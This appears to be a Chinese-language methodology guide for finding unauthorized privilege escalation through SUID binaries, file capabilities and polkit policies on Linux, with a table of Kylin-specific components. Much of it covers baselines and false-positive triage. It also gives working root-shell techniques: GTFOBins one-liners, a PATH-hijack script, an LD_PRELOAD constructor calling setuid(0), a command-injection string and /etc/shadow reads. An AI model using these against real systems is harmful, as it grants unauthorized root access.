# SUID / Capabilities 未授权漏洞挖掘方法

## 核心判定标准

**普通用户能否通过该 SUID/cap 执行原本需要 root 的操作 → 能 = 未授权漏洞**

## 关键原则：权限边界先行

**在任何测试之前，必须先建立权限基线：普通用户在默认系统上能做什么、不能做什么。**

没有权限基线，任何"发现"都可能是误报。

验证逻辑（五步判定）：

```
0. 权限边界：普通用户默认能做什么？  → 基线建立（必须先做）
1. 功能识别：这个 SUID/cap 能做什么？ → 功能分析
2. 可达性：普通用户能调用吗？        → 调用测试
3. 影响验证：操作真的生效了吗？      → 系统级验证
4. 权限对比：是否绕过了应有权限？    → 对比基线
```

**四步全部为 YES（且步骤 0 确认操作需要 root） → 确认未授权漏洞**

## 拒绝标准（任一条件满足 → 停止，判定为非漏洞）

| 条件 | 说明 | 示例 |
|------|------|------|
| 操作本身为普通用户设计 | 该功能就是给普通用户用的 | 管理个人网络连接、修改个人密码 |
| 默认无需认证即可执行 | 不依赖任何权限提升机制 | `nmcli connection add` 本身不需要 polkit |
| 策略配置符合设计意图 | `allow_active=yes` 对个人设置是正常的 | `settings.modify.own` 允许用户管理自己的连接 |
| 操作被系统拦截 | 执行失败或无实际效果 | 需要认证但未提供密码 |
| 开源组件未修改 | 配置与上游一致，用户未标注差异 | 用户未标注"修改"的开源组件 |

**如果不确定是否为"设计意图"，查证方法：**
1. 查看同一服务的其他 action 对比（如 `modify.own` vs `modify.system`）
2. 搜索官方文档或 man page 确认该操作的预期权限
3. 在干净系统上测试默认行为

## 优先级策略（效率原则）

**自研组件 > 开源组件**：优先测试自研/第三方组件，开源组件除非有明确差异否则跳过。

| 组件类型 | 配置来源 | 测试策略 |
|---------|---------|---------|
| 开源组件（未修改） | 与上游一致 | 跳过，不测试 |
| 开源组件（已修改） | 用户标注 | 按用户标注的差异重点测试 |
| 自研组件（kydima、ksaf、ukui 等） | 厂商自定义 | 重点分析 |
| 第三方组件（qaxbrowser 等） | 来源不明 | 重点分析 |

**关键原则**：
- 不要自行对比上游配置，用户能自行判断配置是否被修改
- 用户标注了"修改"或具体差异时才测试，未标注的默认跳过
- **用户确认"与上游一致"= 无漏洞**，无需继续测试

---

## 阶段零：权限边界基线（必须首先完成）

**在测试任何目标之前，先建立权限基线。**

### 0.1 确认当前用户身份

```bash
id  # 确认为普通用户，非 root
whoami
```

### 0.2 测试目标操作的默认权限

```bash
# 以普通用户直接执行目标操作，观察是否需要认证
# 例如：测试 nmcli 是否需要 polkit 认证
nmcli connection add type wifi ifname wlan0 con-name test_con ssid test_con

# 如果需要认证，会弹出 polkit 对话框或返回错误
# 如果不需要认证，说明该操作本身就是为普通用户设计的
```

### 0.3 对比同服务的其他操作

```bash
# 查看同一服务的其他 polkit action 的权限配置
pkaction | grep <service>
pkaction --action-id <action_1> --verbose | grep implicit
pkaction --action-id <action_2> --verbose | grep implicit

# 对比：如果 personal 设置允许 without auth，但 system 设置需要 auth_admin
# 说明该服务区分了"个人操作"和"系统操作"，personal 设置给普通用户是正常的
```

### 0.4 记录基线结论

```
基线结论：[该操作默认需要 root] / [该操作默认允许普通用户]
如果为"默认允许普通用户" → 停止测试，判定为非漏洞
如果为"默认需要 root" → 继续后续测试
```

---

## 阶段一：侦察

### 1.1 发现目标

```bash
# SUID 文件
find / -perm -4000 -type f 2>/dev/null

# SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 文件能力
find / -type f -exec getcap {} + 2>/dev/null
```

### 1.2 获取基本信息

```bash
# 权限、属主
ls -la <binary>

# 文件类型
file <binary>

# 来源包
rpm -qf <binary> 2>/dev/null || dpkg -S <binary> 2>/dev/null || echo "NOT_IN_PACKAGE"
```

### 1.3 识别功能（strings 分析）

```bash
# 查看二进制中的关键字符串，判断它能做什么
strings <binary> | grep -iE '<关键词>'

# 关键词根据能力/SUID类型选择：
# - 读文件相关：open, read, cat, file, path, /etc
# - 写文件相关：write, create, delete, remove, chmod, chown
# - 进程相关：exec, spawn, fork, ptrace, process
# - 挂载相关：mount, umount, loop, tmpfs, overlay
# - 网络相关：bind, listen, connect, socket
# - 认证相关：passwd, auth, pam, password, shadow
# - 系统配置：sysctl, modprobe, insmod, kernel, module
```

### 1.4 strace 动态跟踪

按攻击面分类进行针对性跟踪，比全量 strace 更高效：

```bash
# 文件操作 — 看它读写哪些文件
strace -e trace=open,openat,read,write,stat,unlink,chmod,chown <binary> <args> 2>&1

# 进程操作 — 看它是否执行外部命令或操作其他进程
strace -e trace=execve,fork,clone,ptrace,kill <binary> <args> 2>&1

# 网络操作 — 看它是否建立连接或创建 socket
strace -e trace=socket,bind,connect,sendto,recvfrom <binary> <args> 2>&1

# 全面跟踪 — 输出到文件避免干扰终端
strace -f -o /tmp/strace.log <binary> <args>
grep -E 'open|exec|socket|bind' /tmp/strace.log
```

**目的**：看到二进制实际在做什么，比 strings 更准确。重点关注：
- `execve` 调用 → 命令注入的可能入口
- `open` 的路径是否来自用户输入 → 路径遍历
- `socket` + `bind` → 是否开启了监听端口

### 1.5 安全特性检查

```bash
# 二进制类型和架构
file <binary>

# 安全编译选项（优先用 checksec，回退到 readelf）
checksec --file=<binary> 2>/dev/null || readelf -l <binary> | grep -E 'GNU_STACK|GNU_RELRO'

# 解读：
# 无 CANARY (__stack_chk_fail) → 栈溢出利用无阻碍
# GNU_STACK 有 E (Execute) → 可执行栈，shellcode 可直接运行
# 无 PIE (Type: EXEC) → 地址固定，ROP 利用更简单
# 无 RELRO → GOT 表可写，可劫持函数指针
```

**危险信号速查**：

| 缺失防护 | 利用意义 |
|---------|---------|
| 无 Stack Canary | 栈缓冲区溢出可直接覆盖返回地址 |
| NX 栈 (GNU_STACK 含 E) | 可在栈上执行 shellcode |
| 无 PIE | 代码/数据段地址固定，ROP gadget 可硬编码 |
| 无 Full RELRO | GOT 表可写，可劫持外部函数指针 |

### 1.6 导入函数分析

```bash
# 列出所有外部符号（动态链接的函数）
nm -D <binary> | grep " U " | sort

# 重点关注危险函数：
nm -D <binary> | grep -E " U (system|popen|exec|fork|dlopen|ptrace)$"
nm -D <binary> | grep -E " U (sprintf|strcpy|strcat|gets|scanf|read)$"
nm -D <binary> | grep -E " U (chmod|chown|setuid|setgid|cap_)"
```

**危险函数信号**：

| 导入函数 | 可能漏洞类型 |
|---------|------------|
| `system` / `popen` / `exec*` | 命令注入 |
| `sprintf` / `strcpy` / `gets` / `scanf` | 缓冲区溢出 |
| `chmod` / `chown` / `setuid` | 权限篡改 |
| `dlopen` | 任意库加载 |
| `ptrace` | 进程注入 |
| 无 `__stack_chk_fail` | 无栈保护（编译时未启用 -fstack-protector） |

### 1.7 格式化字符串检测

```bash
# 检测二进制中的格式化字符串
strings <binary> | grep -E '%[0-9]*\$?[sduxnp%]'

# 如果发现 %s/%d/%x/%n 等格式化占位符
# 且对应的函数是 printf(fmt) 而非 printf("%s", fmt)
# → 可能接受外部输入作为 format 参数 → 格式化字符串漏洞
```

### 1.8 文件路径提取

```bash
# 提取二进制中引用的所有绝对路径
strings <binary> | grep -E '^/(usr/|etc/|var/|tmp/|dev/|sys/|proc/)?[a-zA-Z0-9._/-]+$'

# 重点关注：
# /etc/ → 配置文件路径，可能可控
# /tmp/ → 临时文件，可能被竞争
# /dev/ → 设备文件，可能用于 IO 操作
```

---

## 阶段二：可达性验证

### 2.1 普通用户执行测试

```bash
# SUID 文件：直接执行
<binary> <参数>

# Capabilities 文件：直接执行（普通用户继承能力）
<binary> <参数>

# 验证当前用户身份
id
whoami
```

### 2.2 确认操作需要权限提升

```bash
# 如果步骤 0 已确认该操作默认需要 root，跳过此步
# 如果步骤 0 不确定，再次确认：

# 方法1：直接执行，观察是否弹出 polkit 认证对话框
<command>

# 方法2：查看 polkit 策略中该操作的配置
pkaction --action-id <action> --verbose | grep implicit

# 方法3：在干净系统上测试（如果有条件）
```

---

## 阶段三：影响验证（系统级）

**关键原则：不依赖命令返回值，用系统级命令验证操作是否真正生效。**

### 3.1 文件读取类

```bash
# 利用前：确认目标文件不可读
cat /etc/shadow 2>&1 | head -1  # 应报错

# 利用后：确认已读到内容
<binary> <参数>  # 执行利用命令

# 系统级验证：对比文件内容
md5sum /etc/shadow  # 获取真实 hash
wc -c /etc/shadow   # 获取真实大小
# 与利用命令输出对比
```

### 3.2 文件写入类

```bash
# 利用前：记录原始状态
ls -la /etc/passwd | awk '{print $1,$3,$4}'
cat /etc/passwd | wc -l

# 利用后：验证变更
ls -la /etc/passwd | awk '{print $1,$3,$4}'
cat /etc/passwd | wc -l
# 或检查是否写入了特定内容
grep 'attacker' /etc/passwd
```

### 3.3 进程操作类

```bash
# 利用前：记录目标进程
ps aux | grep <target>

# 利用后：验证进程被操作
ps aux | grep <target>
# 检查进程状态、内存、fd 等
ls -la /proc/<pid>/fd
```

### 3.4 系统配置类

```bash
# 利用前：记录原始配置
sysctl <参数> 2>/dev/null
cat /proc/sys/<参数>

# 利用后：验证配置已变更
sysctl <参数> 2>/dev/null
cat /proc/sys/<参数>
```

### 3.5 认证类

```bash
# 利用前：确认无法修改密码
passwd 2>&1  # 应报错

# 利用后：验证密码已变更
# 尝试用新密码登录或 su
```

---

## 阶段四：漏洞确认

### 确认标准

| 判定项 | 条件 | 结果 |
|-------|------|------|
| 权限基线 | 该操作默认需要 root（步骤 0 已确认） | YES |
| 功能识别 | 二进制/策略可执行特权操作 | YES |
| 可达性 | 普通用户可调用 | YES |
| 影响验证 | 操作真正生效（系统级验证） | YES |
| **结论** | **四项全 YES** | **未授权漏洞** |

### 拒绝标准（任一满足 → 非漏洞）

| 判定项 | 条件 | 结果 |
|-------|------|------|
| 设计意图 | 该操作本身就是为普通用户设计的 | **非漏洞** |
| 默认权限 | 不依赖任何权限提升机制即可执行 | **非漏洞** |
| 操作拦截 | 执行失败或无实际效果 | **非漏洞** |
| 策略正确 | polkit 配置符合该操作的安全要求 | **非漏洞** |

### 风险定级

| 条件 | 等级 |
|------|------|
| 普通用户可执行 root 级操作（读写任意文件、执行命令等） | P0 |
| 普通用户可执行敏感操作（修改系统配置、操作特权进程等） | P1 |
| 普通用户可执行有限特权操作（读取特定文件、操作指定资源等） | P2 |
| 仅信息泄露，无实际操作影响 | P3 |

---

## 常见场景与验证模板

### 场景 A：SUID 二进制可读取任意文件

```bash
# 识别：strings 显示 open/read 等系统调用
strings <binary> | grep -iE 'open|read|file'

# 验证：
# 1. 确认普通用户不能读 /etc/shadow
cat /etc/shadow 2>&1 | head -1
# 2. 用该二进制读取
<binary> /etc/shadow
# 3. 系统级验证
md5sum /etc/shadow  # 对比真实 hash
```

### 场景 B：SUID 二进制可写入任意文件

```bash
# 识别：strings 显示 write/chmod/chown 等
strings <binary> | grep -iE 'write|chmod|chown|create'

# 验证：
# 1. 记录原始状态
ls -la /etc/passwd
# 2. 尝试写入
<binary> <参数>
# 3. 验证变更
ls -la /etc/passwd
grep 'newuser' /etc/passwd
```

### 场景 C：Capabilities 可绕过权限检查

```bash
# 识别：getcap 显示高危能力
getcap <binary>
# 例如：cap_dac_override,cap_sys_rawio=ep

# 验证：
# 0. 基线：确认普通用户默认不能读 /etc/shadow
cat /etc/shadow 2>&1 | head -1  # 应报 Permission denied
# 1. 利用能力
<binary> /etc/shadow
# 2. 系统级验证
md5sum /etc/shadow  # 对比真实 hash

# 如果步骤 0 显示普通用户本来就能读 /etc/shadow → 非漏洞
```

### 场景 D：SUID 二进制可执行系统命令

```bash
# 识别：strings 显示 exec/system/popen 等
strings <binary> | grep -iE 'exec|system|popen|/bin/sh'

# 验证：
# 0. 基线：确认普通用户不能执行需要 root 的命令
id  # 确认是普通用户
# 1. 执行利用命令
<binary> '; id; #'
# 2. 验证输出中包含 root uid
# 如果输出显示 uid=0(root) → 漏洞确认
# 如果输出显示 uid=1000(cl) → 非漏洞（只是以当前用户执行）
```

---

## GTFOBins 快速参考

遇到系统默认的 SUID 二进制时，先查 GTFOBins 是否有已知利用方法：
https://gtfobins.org/

常用默认 SUID 及其利用方向：
- `find` — `find . -exec /bin/sh -p \; -quit`
- `vim` — `vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset")'`
- `python` — `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
- `mount` — 挂载任意设备，配合 bind mount 绕过路径限制
- `cp`/`mv` — 覆盖 `/etc/passwd` 或 `/etc/sudoers`

原则：系统默认 SUID + 有 GTFOBins 条目 → 优先验证。

---

## 环境变量劫持 (PATH Manipulation)

**触发条件**：SUID 二进制在代码中使用相对路径调用外部命令。

不安全做法：
```c
system("ps aux");     // 使用相对路径 "ps"
execvp("cat", args);  // 从 PATH 搜索 "cat"
```

攻击：
```bash
# 1. 创建恶意脚本，名字与目标程序调用的命令相同
echo '#!/bin/bash' > /tmp/ps
echo '/bin/bash -p' >> /tmp/ps
chmod +x /tmp/ps

# 2. 将 /tmp 插入 PATH 最前面
export PATH=/tmp:$PATH

# 3. 执行 SUID 程序 → 它调用 "ps" 时实际执行 /tmp/ps → root shell
./vuln_suid
```

**检测方法**：
```bash
# strings 找疑似 system()/execvp() 调用的相对路径命令名
strings <binary> | grep -E '^(ps|cat|ls|grep|cp|mv|rm|sh|bash|python|perl|awk|sed|id|whoami)$'

# strace 观察 execve 实际执行的路径
strace -e trace=execve <binary> 2>&1 | grep 'execve("/'
```

**关键**：`bash -p` 是必须的 — bash 默认检查 euid 是否等于 ruid，不一致时降权。-p 跳过检查使 SUID 的 euid 生效。

---

## LD_PRELOAD 注入

**触发条件**：SUID 二进制未做 `AT_SECURE` 防护，或具有 capability 的二进制允许 LD_PRELOAD。

**原理**：LD_PRELOAD 定义的 .so 文件在程序启动时最先加载，`__attribute__((constructor))` 函数在 main() 之前执行。

```bash
# 1. 编写恶意 hook.so
cat > /tmp/hook.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
static void init(void) {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl

# 2. 尝试注入
LD_PRELOAD=/tmp/hook.so <binary>
# SUID 二进制有 AT_SECURE 保护 → GLIBC 忽略 LD_PRELOAD → 注入失败
# 注入成功 → 以 root 权限执行 hook.so 的 constructor
```

---

## Polkit 策略测试方法

### 权限边界基线

```bash
# 1. 查看 action 的默认权限
pkaction --action-id <action> --verbose | grep implicit
# implicit inactive: yes → 非活跃会话无需认证
# implicit inactive: auth_admin_keep → 非活跃会话需要管理员认证

# 2. 对比同一服务的其他 action
pkaction | grep <service>
# 如果 modify.own 是 yes 但 modify.system 是 auth_admin_keep
# 说明服务区分了"个人操作"和"系统操作"，这是正常设计

# 3. 测试操作本身是否需要认证
<command>  # 观察是否弹出 polkit 对话框
```

### 拒绝标准（Polkit 专项）

- `modify.own` + `allow_active: yes` → 正常（用户管理自己的设置）
- `modify.system` + `allow_active: auth_admin` → 正常（系统设置需要管理员）
- `enable-disable-network` + `allow_inactive: no` → 正常（非活跃会话不允许禁用网络）

**只有当 `modify.system` 或 `enable-disable-*` 等系统级操作配置为 `yes` 时，才是真正的漏洞。**

---

## 麒麟特有组件速查

| 组件 | 二进制 | 功能 | 验证重点 |
|------|-------|------|---------|
| KYSEC | kydima_set | 安全监控开关 | 能否关闭监控 |
| UKUI | ukui-screensaver-checkpass | 锁屏验证 | 能否绕过锁屏 |
| UKUI | changeuserpwd | 密码修改 | 能否修改他人密码 |
| 三权分立 | security-reinforce-daemon | 安全加固 | 能否注入进程 |
| 三权分立 | ksaf_auth | 认证 | 能否绕过认证 |
| 可信计算 | kytrust_config | 信任链配置 | 能否篡改启动链 |
| 盒子 | boxmount/boxumount | 挂载管理 | 能否挂载/卸载任意路径 |
